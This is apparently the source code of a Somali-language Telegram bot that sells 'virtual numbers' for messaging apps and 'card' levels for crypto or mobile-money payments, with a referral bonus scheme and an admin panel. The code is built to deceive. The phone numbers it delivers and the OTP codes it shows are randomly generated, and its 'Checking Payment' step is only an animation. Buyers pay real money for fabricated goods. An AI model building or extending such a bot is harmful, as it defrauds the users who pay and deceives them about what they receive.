import os
import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command, StateFilter
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.client.default import DefaultBotProperties

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

LOCAL_NUMBER = "+252907868526"
BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ================= GLOBAL STORAGE =================
users = {}
withdraw_requests = {}
REQUEST_ID = 29000

stats = {
    "total_users": 0,
    "total_virtual": 0,
    "total_card": 0
}

# ================= STATES =================
class VirtualState(StatesGroup):
    waiting_screenshot = State()

class CardState(StatesGroup):
    waiting_screenshot = State()

class WithdrawState(StatesGroup):
    waiting_local = State()
    waiting_crypto = State()

class AdminState(StatesGroup):
    waiting_add_balance = State()

# ================= HELPERS =================
def random_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def generate_otp():
    return "".join(random.choices("0123456789", k=6))

def generate_referral():
    return "".join(random.choices("0123456789", k=10))

async def live_animation(msg: Message, text="Checking", seconds=3):
    for i in range(seconds):
        dots = "." * (i % 4)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    uid = msg.from_user.id
    args = msg.text.split()

    # New user
    if uid not in users:
        users[uid] = {
            "balance": 0.0,
            "referral_code": generate_referral(),
            "referrals": 0
        }
        stats["total_users"] += 1

    # Referral system
    if len(args) > 1:
        ref_code = args[1]
        for user_id, data in users.items():
            if data["referral_code"] == ref_code and user_id != uid:
                data["balance"] += 0.3
                data["referrals"] += 1
                await bot.send_message(
                    user_id,
                    "🎉 New user from your Referal !\n💵 $0.3 ayaa laguugu daray."
                )
                break

    # Main keyboard
    keyboard = [
        [KeyboardButton(text="New Order")],
        [KeyboardButton(text="Balance"), KeyboardButton(text="Referral")],
        [KeyboardButton(text="Withdrawal")]
    ]

    # Admin only button
    if uid == ADMIN_ID:
        keyboard.append([KeyboardButton(text="Admin Panel")])

    kb = ReplyKeyboardMarkup(
        keyboard=keyboard,
        resize_keyboard=True
    )

    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)


# ================= BALANCE =================
@dp.message(F.text == "Balance")
async def balance(msg: Message):
    uid = msg.from_user.id
    bal = users.get(uid, {}).get("balance", 0)
    await msg.answer(f"💰 Balance-kaaga: ${bal:.2f}")


# ================= REFERRAL =================
@dp.message(F.text == "Referral")
async def referral(msg: Message):
    uid = msg.from_user.id
    code = users[uid]["referral_code"]
    refs = users[uid]["referrals"]

    me = await bot.get_me()

    await msg.answer(
        f"🔗 Referral Code: {code}\n"
        f"👥 Referrals: {refs}\n"
        f"💵 Earn per user: $0.3\n\n"
        f"Share link:\n"
        f"https://t.me/{me.username}?start={code}"
    )


# ================= ADMIN PANEL =================
@dp.message(F.text == "Admin Panel")
async def admin_panel(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return

    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Stats")],
            [KeyboardButton(text="Add Balance")],
            [KeyboardButton(text="Withdrawal Check")],
            [KeyboardButton(text="Back")]
        ],
        resize_keyboard=True
    )

    await msg.answer("🔐 ADMIN PANEL", reply_markup=kb)

    # ================= ADMIN STATS =================
@dp.message(F.text == "Stats")
async def admin_stats(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return

    total_balance = sum(user.get("balance", 0) for user in users.values())

    await msg.answer(
        f"📊 BOT STATS\n\n"
        f"👥 Total Users: {stats['total_users']}\n"
        f"💰 Total Balance (All Users): ${total_balance:.2f}\n"
        f"📱 Total Virtual Orders: {stats['total_virtual']}\n"
        f"💳 Total Card Orders: {stats['total_card']}\n"
        f"💸 Total Withdraw Requests: {len(withdraw_requests)}"
    )


# ================= ADD BALANCE =================
@dp.message(F.text == "Add Balance")
async def add_balance_start(msg: Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return

    await msg.answer("Geli user_id iyo amount\nFormat:\n7983838654 5")
    await state.set_state(AdminState.waiting_add_balance)


@dp.message(StateFilter(AdminState.waiting_add_balance))
async def add_balance_process(msg: Message, state: FSMContext):
    try:
        user_id, amount = msg.text.split()
        user_id = int(user_id)
        amount = float(amount)

        if user_id not in users:
            await msg.answer("❌ User lama helin.")
            return

        users[user_id]["balance"] += amount

        await msg.answer(f"✅ ${amount:.2f} ayaa lagu daray user {user_id}")
        await bot.send_message(
            user_id,
            f"💰 Admin ayaa ku siiyay ${amount:.2f}\nBalance cusub: ${users[user_id]['balance']:.2f}"
        )

    except:
        await msg.answer("❌ Format khaldan.")

    await state.clear()


# ================= WITHDRAWAL CHECK =================
@dp.message(F.text == "Withdrawal Check")
async def withdrawal_check(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return

    if not withdraw_requests:
        await msg.answer("Ma jiro withdrawal la dalbaday.")
        return

    text = "💳 WITHDRAWAL LIST\n\n"

    for req_id, data in withdraw_requests.items():
        text += (
            f"🧾 ID: {req_id}\n"
            f"👤 User: {data['user']}\n"
            f"💵 Amount: ${data['amount']:.2f}\n"
            f"🏦 Address/Number: {data['address']}\n"
            f"⏳ Status: {data.get('status','Pending')}\n\n"
        )

    await msg.answer(text)


# ================= BACK BUTTON =================
@dp.message(F.text == "Back")
async def back_to_main(msg: Message):
    if msg.from_user.id == ADMIN_ID:
        keyboard = [
            [KeyboardButton(text="New Order")],
            [KeyboardButton(text="Balance"), KeyboardButton(text="Referral")],
            [KeyboardButton(text="Withdrawal")],
            [KeyboardButton(text="Admin Panel")]
        ]
    else:
        keyboard = [
            [KeyboardButton(text="New Order")],
            [KeyboardButton(text="Balance"), KeyboardButton(text="Referral")],
            [KeyboardButton(text="Withdrawal")]
        ]

    kb = ReplyKeyboardMarkup(
        keyboard=keyboard,
        resize_keyboard=True
    )

    await msg.answer("Main Menu", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual_start")],
        [InlineKeyboardButton(text="CARD", callback_data="card_start")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)


# ================= VIRTUAL START =================
@dp.callback_query(F.data == "virtual_start")
async def virtual_start(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="v_WHATSAPP")],
        [InlineKeyboardButton(text="INSTAGRAM", callback_data="v_INSTAGRAM")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="v_TELEGRAM")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)


# ================= SELECT PLATFORM =================
@dp.callback_query(F.data.startswith("v_"))
async def virtual_platform(call: CallbackQuery):
    platform = call.data.split("_")[1]
    uid = call.from_user.id
    number = random_number()

    users[uid]["last_virtual"] = {
        "platform": platform,
        "number": number,
        "price": 0.8
    }

    # AUTO USE BALANCE
    if users[uid]["balance"] >= 0.8:
        users[uid]["balance"] -= 0.8
        stats["total_virtual"] += 1

        await call.message.edit_text(
            f"✅ $0.8 ayaa laga jaray balance-kaaga\n\n"
            f"📱 Platform: {platform}\n"
            f"📞 Number: {number}"
        )
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])

    await call.message.edit_text(
        f"📱 Platform: {platform}\n"
        f"📞 Number: {number}\n"
        f"💵 Price: $0.8\n\nDooro Payment:",
        reply_markup=kb
    )


# ================= VIRTUAL LOCAL =================
@dp.callback_query(F.data == "v_local")
async def virtual_local(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    data = users[uid]["last_virtual"]

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm")]
    ])

    await call.message.edit_text(
        f"Lacagta ku dir:\n{LOCAL_NUMBER}\n\n"
        f"Number: {data['number']}\n"
        f"Price: $0.8",
        reply_markup=kb
    )


# ================= VIRTUAL CRYPTO =================
@dp.callback_query(F.data == "v_crypto")
async def virtual_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm")]
    ])

    await call.message.edit_text(
        f"Dir Crypto:\n\n"
        f"USDT: <code>{USDT_ADDRESS}</code>\n"
        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
        f"Price: $0.8",
        reply_markup=kb
    )


# ================= CONFIRM PAYMENT =================
@dp.callback_query(F.data == "v_confirm")
async def confirm_virtual(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking Payment...")
    await live_animation(msg)

    await call.message.answer("Soo dir Screenshot-ka Payment-ka")
    await state.set_state(VirtualState.waiting_screenshot)


# ================= RECEIVE SCREENSHOT =================
@dp.message(StateFilter(VirtualState.waiting_screenshot), F.photo)
async def receive_virtual(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = users[uid]["last_virtual"]

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_v_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_v_reject_{uid}")
        ]
    ])

    caption = (
        f"📱 NEW VIRTUAL ORDER\n\n"
        f"👤 User: {uid}\n"
        f"Platform: {data['platform']}\n"
        f"Number: {data['number']}\n"
        f"Price: $0.8"
    )

    await bot.send_photo(
        ADMIN_ID,
        msg.photo[-1].file_id,
        caption=caption,
        reply_markup=kb
    )

    await msg.answer("⏳ Dalabkaaga waa la hubinayaa.")
    await state.clear()


# ================= ADMIN CONFIRM VIRTUAL =================
@dp.callback_query(F.data.startswith("admin_v_confirm_"))
async def admin_v_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    data = users[uid]["last_virtual"]

    stats["total_virtual"] += 1

    await bot.send_message(
        uid,
        f"✅ Payment Confirmed\n\n"
        f"📱 Platform: {data['platform']}\n"
        f"📞 Number: {data['number']}"
    )

    await call.message.edit_caption("✅ VIRTUAL PAYMENT CONFIRMED")


# ================= ADMIN REJECT VIRTUAL =================
@dp.callback_query(F.data.startswith("admin_v_reject_"))
async def admin_v_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[3])

    await bot.send_message(
        uid,
        "❌ Payment lama xaqiijin."
    )

    await call.message.edit_caption("❌ VIRTUAL PAYMENT REJECTED")

# ================= CARD START =================
@dp.callback_query(F.data == "card_start")
async def card_start(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LEVEL 1", callback_data="card_1")],
        [InlineKeyboardButton(text="LEVEL 2", callback_data="card_2")]
    ])
    await call.message.edit_text("Dooro Card Level:", reply_markup=kb)


# ================= SELECT CARD LEVEL =================
@dp.callback_query(F.data.startswith("card_"))
async def select_card(call: CallbackQuery):
    level = call.data.split("_")[1]
    uid = call.from_user.id
    number = random_number()

    users[uid]["last_card"] = {
        "level": level,
        "number": number,
        "price": 5.0
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="card_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="card_crypto")]
    ])

    await call.message.edit_text(
        f"💳 Card Level: {level}\n"
        f"📞 Number: {number}\n"
        f"💵 Price: $5\n\nDooro Payment:",
        reply_markup=kb
    )


# ================= CARD LOCAL =================
@dp.callback_query(F.data == "card_local")
async def card_local(call: CallbackQuery):
    data = users[call.from_user.id]["last_card"]

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="card_confirm")]
    ])

    await call.message.edit_text(
        f"Lacagta ku dir:\n{LOCAL_NUMBER}\n\n"
        f"Number: {data['number']}\n"
        f"Level: {data['level']}\n"
        f"Price: $5",
        reply_markup=kb
    )


# ================= CARD CRYPTO =================
@dp.callback_query(F.data == "card_crypto")
async def card_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="card_confirm")]
    ])

    await call.message.edit_text(
        f"Dir Crypto:\n\n"
        f"USDT: <code>{USDT_ADDRESS}</code>\n"
        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
        f"Price: $5",
        reply_markup=kb
    )


# ================= CARD CONFIRM =================
@dp.callback_query(F.data == "card_confirm")
async def confirm_card(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking Payment...")
    await live_animation(msg)

    await call.message.answer("Soo dir Screenshot-ka Payment-ka")
    await state.set_state(CardState.waiting_screenshot)


# ================= RECEIVE CARD SCREENSHOT =================
@dp.message(StateFilter(CardState.waiting_screenshot), F.photo)
async def receive_card(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = users[uid]["last_card"]

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_card_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_card_reject_{uid}"),
            InlineKeyboardButton(text="ASK", callback_data=f"admin_card_ask_{uid}")
        ]
    ])

    caption = (
        f"💳 NEW CARD ORDER\n\n"
        f"👤 User: {uid}\n"
        f"Level: {data['level']}\n"
        f"Number: {data['number']}\n"
        f"Price: $5"
    )

    await bot.send_photo(
        ADMIN_ID,
        msg.photo[-1].file_id,
        caption=caption,
        reply_markup=kb
    )

    await msg.answer("⏳ Dalabkaaga waa la hubinayaa.")
    await state.clear()


# ================= ADMIN CONFIRM CARD =================
@dp.callback_query(F.data.startswith("admin_card_confirm_"))
async def admin_card_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    data = users[uid]["last_card"]

    stats["total_card"] += 1

    await bot.send_message(
        uid,
        f"✅ Payment Confirmed\n\n"
        f"💳 Level: {data['level']}\n"
        f"📞 Number: {data['number']}"
    )

    await call.message.edit_caption("✅ CARD PAYMENT CONFIRMED")


# ================= ADMIN REJECT CARD =================
@dp.callback_query(F.data.startswith("admin_card_reject_"))
async def admin_card_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[3])

    await bot.send_message(uid, "❌ Payment lama xaqiijin.")
    await call.message.edit_caption("❌ CARD PAYMENT REJECTED")


# ================= ADMIN ASK CARD =================
@dp.callback_query(F.data.startswith("admin_card_ask_"))
async def admin_card_ask(call: CallbackQuery):
    uid = int(call.data.split("_")[3])

    await bot.send_message(uid, "ℹ️ Admin ayaa kula soo xiriiri doona.")
    await call.message.edit_caption("⚠️ ADMIN REQUESTED USER")

# ================= WITHDRAWAL MENU =================
@dp.message(F.text == "Withdrawal")
async def withdrawal_menu(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="wd_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="wd_crypto")]
    ])
    await msg.answer("Dooro Withdrawal Type:", reply_markup=kb)


# ================= LOCAL WITHDRAW =================
@dp.callback_query(F.data == "wd_local")
async def wd_local(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Soo dir numberkaaga kadib amount (min $1)\nFormat:\nNumber Amount")
    await state.set_state(WithdrawState.waiting_local)


@dp.message(StateFilter(WithdrawState.waiting_local))
async def process_local_withdraw(msg: Message, state: FSMContext):
    global REQUEST_ID
    uid = msg.from_user.id

    try:
        number, amount = msg.text.split()
        amount = float(amount)

        if amount < 1:
            await msg.answer("❌ Minimum withdrawal waa $1")
            return

        if users[uid]["balance"] < amount:
            await msg.answer("❌ Balance kuma filna.")
            return

        users[uid]["balance"] -= amount
        REQUEST_ID += 1

        withdraw_requests[REQUEST_ID] = {
            "user": uid,
            "amount": amount,
            "address": number,
            "status": "Pending"
        }

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="CONFIRM", callback_data=f"wd_confirm_{REQUEST_ID}"),
                InlineKeyboardButton(text="REJECT", callback_data=f"wd_reject_{REQUEST_ID}")
            ]
        ])

        await bot.send_message(
            ADMIN_ID,
            f"💳 NEW WITHDRAWAL\n\n"
            f"👤 User: {uid}\n"
            f"💵 Amount: ${amount:.2f}\n"
            f"🧾 Request ID: {REQUEST_ID}\n"
            f"🏦 Number: {number}\n"
            f"⏳ Status: Pending",
            reply_markup=kb
        )

        await msg.answer(
            f"✅ Withdrawal Request Sent\n"
            f"🧾 Request ID: {REQUEST_ID}\n"
            f"💵 Amount: ${amount:.2f}\n"
            f"🏦 Number: {number}\n"
            f"💰 Balance Left: ${users[uid]['balance']:.2f}\n"
            f"⏳ Status: Pending"
        )

    except:
        await msg.answer("❌ Format khaldan.")

    await state.clear()


# ================= CRYPTO WITHDRAW =================
@dp.callback_query(F.data == "wd_crypto")
async def wd_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="USDT-BEP20", callback_data="wd_usdt")],
        [InlineKeyboardButton(text="CANCEL", callback_data="wd_cancel")]
    ])
    await call.message.edit_text("Dooro Crypto Type:", reply_markup=kb)


@dp.callback_query(F.data == "wd_usdt")
async def wd_usdt(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Soo dir USDT Address kadib amount (min $1)\nFormat:\nAddress Amount")
    await state.set_state(WithdrawState.waiting_crypto)


@dp.message(StateFilter(WithdrawState.waiting_crypto))
async def process_crypto_withdraw(msg: Message, state: FSMContext):
    global REQUEST_ID
    uid = msg.from_user.id

    try:
        address, amount = msg.text.split()
        amount = float(amount)

        if amount < 1:
            await msg.answer("❌ Minimum withdrawal waa $1")
            return

        if users[uid]["balance"] < amount:
            await msg.answer("❌ Balance kuma filna.")
            return

        users[uid]["balance"] -= amount
        REQUEST_ID += 1

        withdraw_requests[REQUEST_ID] = {
            "user": uid,
            "amount": amount,
            "address": address,
            "status": "Pending"
        }

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="CONFIRM", callback_data=f"wd_confirm_{REQUEST_ID}"),
                InlineKeyboardButton(text="REJECT", callback_data=f"wd_reject_{REQUEST_ID}")
            ]
        ])

        await bot.send_message(
            ADMIN_ID,
            f"💳 NEW WITHDRAWAL\n\n"
            f"👤 User: {uid}\n"
            f"💵 Amount: ${amount:.2f}\n"
            f"🧾 Request ID: {REQUEST_ID}\n"
            f"🏦 Address: {address}\n"
            f"⏳ Status: Pending",
            reply_markup=kb
        )

        await msg.answer(
            f"✅ Withdrawal Request Sent\n"
            f"🧾 Request ID: {REQUEST_ID}\n"
            f"💵 Amount: ${amount:.2f}\n"
            f"🏦 Address: {address}\n"
            f"💰 Balance Left: ${users[uid]['balance']:.2f}\n"
            f"⏳ Status: Pending"
        )

    except:
        await msg.answer("❌ Format khaldan.")

    await state.clear()


# ================= ADMIN CONFIRM WITHDRAW =================
@dp.callback_query(F.data.startswith("wd_confirm_"))
async def wd_confirm(call: CallbackQuery):
    req_id = int(call.data.split("_")[2])
    data = withdraw_requests.get(req_id)

    if not data:
        return

    data["status"] = "Paid"

    await bot.send_message(
        data["user"],
        f"✅ Withdrawal Confirmed\n🧾 Request ID: {req_id}\n💵 Amount: ${data['amount']:.2f}"
    )

    await call.message.edit_text(f"✅ Withdrawal {req_id} Paid")


# ================= ADMIN REJECT WITHDRAW =================
@dp.callback_query(F.data.startswith("wd_reject_"))
async def wd_reject(call: CallbackQuery):
    req_id = int(call.data.split("_")[2])
    data = withdraw_requests.get(req_id)

    if not data:
        return

    # Refund
    users[data["user"]]["balance"] += data["amount"]
    data["status"] = "Rejected"

    await bot.send_message(
        data["user"],
        f"❌ Withdrawal Rejected\n🧾 Request ID: {req_id}\nLacagta waa laguu celiyay."
    )

    await call.message.edit_text(f"❌ Withdrawal {req_id} Rejected")


# ================= CANCEL =================
@dp.callback_query(F.data == "wd_cancel")
async def wd_cancel(call: CallbackQuery):
    await call.message.edit_text("Withdrawal Cancelled.")

# ================= ADMIN SEND OTP =================
@dp.callback_query(F.data.startswith("admin_send_otp_"))
async def admin_send_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[3])

    otp = generate_otp()
    users[uid]["otp"] = otp
    users[uid]["otp_requests"] = 0

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp")]
    ])

    await bot.send_message(
        uid,
        f"📱 Number: {users[uid].get('last_virtual', {}).get('number','')}\n"
        f"💳 Status: PAID ✅",
        reply_markup=kb
    )

    await call.message.answer("OTP sent to user.")


# ================= USER SHOW OTP =================
@dp.callback_query(F.data == "show_otp")
async def show_otp(call: CallbackQuery):
    uid = call.from_user.id
    otp = users.get(uid, {}).get("otp")

    if not otp:
        await call.message.edit_text("❌ OTP lama helin.")
        return

    msg = await call.message.edit_text("OTP Loading...")
    await live_animation(msg, "OTP")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again")]
    ])

    await msg.edit_text(f"🔐 OTP Code:\n\n<code>{otp}</code>", reply_markup=kb)


# ================= CHECK AGAIN =================
@dp.callback_query(F.data == "check_again")
async def check_again(call: CallbackQuery):
    uid = call.from_user.id

    users[uid]["otp_requests"] += 1
    new_otp = generate_otp()
    users[uid]["otp"] = new_otp

    msg = await call.message.edit_text("Generating new OTP...")
    await live_animation(msg, "OTP")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again")]
    ])

    await msg.edit_text(f"🔐 NEW OTP:\n\n<code>{new_otp}</code>", reply_markup=kb)

    if users[uid]["otp_requests"] >= 2:
        await bot.send_message(
            ADMIN_ID,
            f"⚠️ User {uid} requested OTP 2 times."
        )


# ================= ADMIN FINAL CONFIRM OTP =================
@dp.callback_query(F.data.startswith("admin_final_otp_"))
async def admin_final_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    final_otp = users[uid].get("otp")

    await bot.send_message(
        uid,
        f"✅ OTP Final Confirmed\n\n<code>{final_otp}</code>\nPayment Verified."
    )

    await call.message.answer(f"User {uid} OTP Final Confirmed.")


# ================= MAIN =================
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
